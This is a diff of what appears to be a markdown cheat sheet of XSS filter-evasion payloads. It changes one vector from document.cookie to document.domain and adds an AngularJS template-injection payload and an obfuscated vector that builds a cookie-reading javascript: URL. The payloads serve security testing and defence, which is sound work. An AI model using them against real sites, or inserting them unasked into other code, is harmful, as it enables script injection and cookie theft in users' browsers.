@@ -243,8 +243,10 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <img/src=`%00`%20onerror=this.onerror=confirm(1)
   <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
   <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
-  ''""><a OnpoINTeRENtEr=confirm(document.cookie)x>
+  ''""><a OnpoINTeRENtEr=confirm(document.domain)x>
   javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+  %7B%7Bconstructor.constructor(%27confirm(document.domain)%27)()%7D%7D
+  "><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
   ```
 </details>
 
